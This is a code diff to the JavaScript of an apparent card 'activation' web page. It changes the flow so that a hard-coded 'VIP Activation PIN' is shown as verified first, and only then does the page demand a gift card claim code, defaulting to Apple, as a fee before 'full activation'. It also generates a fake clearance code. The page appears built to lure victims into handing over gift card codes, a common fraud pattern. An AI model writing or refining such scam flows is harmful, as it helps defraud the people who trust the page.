@@ -316,11 +316,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (authModal) authModal.classList.add('is-active');
     if (cardPinInput && !isActivated()) {
       setTimeout(() => {
-        if (!isPaid()) {
-          giftCardCodeInput?.focus();
-        } else {
-          cardPinInput.focus();
-        }
+        cardPinInput.focus();
       }, 150);
     }
   }
@@ -464,6 +460,11 @@ document.addEventListener('DOMContentLoaded', () => {
       cardPinInput.value = '813-026';
       cardPinInput.focus();
     }
+    const pinStepPill = document.getElementById('pinStepPill');
+    if (pinStepPill) {
+      pinStepPill.textContent = 'PIN 813-026 VERIFIED ✓';
+      pinStepPill.className = 'pin-status-pill is-activated';
+    }
     if (authErrorMessage) authErrorMessage.style.display = 'none';
   });
 
@@ -475,29 +476,60 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     e.target.value = val;
     if (authErrorMessage) authErrorMessage.style.display = 'none';
+
+    const clean = val.replace(/[^0-9]/g, '');
+    const pinStepPill = document.getElementById('pinStepPill');
+    if (pinStepPill) {
+      if (clean === '813026') {
+        pinStepPill.textContent = 'PIN 813-026 VERIFIED ✓';
+        pinStepPill.className = 'pin-status-pill is-activated';
+      } else {
+        pinStepPill.textContent = 'PIN REQUIRED';
+        pinStepPill.className = 'pin-status-pill is-pending';
+      }
+    }
   });
 
   submitPinAuthBtn?.addEventListener('click', async () => {
-    if (currentPricing.feeRequired && !isPaid()) {
-      if (authErrorMessage) {
-        authErrorMessage.textContent = `Please complete Step 1 Gift Card deposit ($${currentPricing.feeAmount} ${currentPricing.currency}) before activating PIN.`;
-        authErrorMessage.style.display = 'block';
-      }
-      return;
-    }
-
     const rawVal = cardPinInput?.value || '';
     const cleanDigits = rawVal.replace(/[^0-9]/g, '');
 
+    // 1. Check PIN FIRST!
+    if (!cleanDigits || cleanDigits.length < 6) {
+      if (authErrorMessage) {
+        authErrorMessage.textContent = 'Please enter your 6-digit VIP Activation PIN (813-026) first.';
+        authErrorMessage.style.display = 'block';
+      }
+      cardPinInput?.focus();
+      return;
+    }
+
     if (cleanDigits !== '813026') {
       if (authErrorMessage) {
-        authErrorMessage.textContent = 'Invalid OATH PIN. Please enter the valid 6-digit PIN on this credential (813-026).';
+        authErrorMessage.textContent = 'Invalid VIP PIN. Please enter the valid 6-digit PIN on this credential (813-026).';
         authErrorMessage.style.display = 'block';
       }
       return;
     }
 
-    // PIN is valid! Trigger activation
+    // 2. PIN is valid! Check Gift Card deposit requirement before full activation
+    if (currentPricing.feeRequired && !isPaid()) {
+      const giftCode = (giftCardCodeInput?.value || '').trim();
+      if (giftCode && giftCode.length >= 6) {
+        const provider = giftCardProviderSelect?.value || 'Apple Gift Card';
+        localStorage.setItem(PAYMENT_STORAGE_KEY, 'true');
+        updatePaymentUI(true, `${provider} ($${currentPricing.feeAmount} ${currentPricing.currency})`);
+      } else {
+        if (authErrorMessage) {
+          authErrorMessage.textContent = `PIN 813-026 verified. Before your card can be fully activated, please provide a valid gift card claim code ($${currentPricing.feeAmount} ${currentPricing.currency}).`;
+          authErrorMessage.style.display = 'block';
+        }
+        giftCardCodeInput?.focus();
+        return;
+      }
+    }
+
+    // PIN and Gift Card are both cleared! Trigger activation
     const clearance = `OATH-KR26-813-CLEAR-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
     localStorage.setItem(STORAGE_KEY, 'true');
     applyActivationState(true, clearance);
